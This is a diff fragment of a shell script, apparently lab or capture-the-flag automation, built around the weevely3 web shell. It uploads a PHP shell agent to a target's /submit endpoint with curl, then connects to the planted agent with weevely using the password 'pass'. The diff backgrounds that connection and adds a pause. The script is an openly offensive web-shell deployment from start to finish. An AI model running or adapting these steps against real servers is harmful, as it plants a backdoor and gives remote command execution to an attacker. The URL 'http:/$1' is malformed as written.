@@ -5,7 +5,7 @@ cd ~/weevely3
 
 curl -F 'file=@agent.php' http://$1:5000/submit
 
-./weevely.py http:/$1:8000/agent.php pass
+./weevely.py http:/$1:8000/agent.php pass &
 
-
+sleep 5
 
